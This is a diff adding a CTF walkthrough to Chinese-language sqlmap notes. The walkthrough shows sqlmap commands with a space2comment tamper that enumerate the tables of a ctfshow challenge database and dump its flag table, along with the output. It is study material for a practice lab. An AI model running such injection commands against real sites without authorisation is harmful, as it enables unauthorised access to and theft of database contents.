@@ -50,3 +50,32 @@ ref: [用法 | sqlmap 用户手册](https://sqlmap.highlight.ink/usage)
 
 - `-t`指定一个文件地址，用于写入 sqlmap 产生的所有流量信息
 - `--eta`预估完成时间
+
+## 实战
+
+![[sqlmap1.png]]
+这一题的环境是一个文章列表，点进去具体的文章页面的链接是`index.php?id=2`，我试着用 Burp 抓到 sqlmap 试一试。
+
+```powershell
+python sqlmap.py -o -r request.txt --level=4 --tamper="space2comment.py" -tables
+...
+Database: web7
+[3 tables]
++----------------------------------------------------+
+| page                                               |
+| user                                               |
+| flag                                               |
++----------------------------------------------------+
+```
+看到`web7`下面有flag，可以将其直接dump出来。
+```powershell
+python sqlmap.py -o -r request.txt --level=4 --tamper="space2comment.py" -dump -D web7 -T flag
+
+[1 entry]
++-----------------------------------------------+
+| flag                                          |
++-----------------------------------------------+
+| ctfshow{311e669c-c978-4f71-af2b-ea7f3be92a93} |
++-----------------------------------------------+
+```
+这道题就出来了。
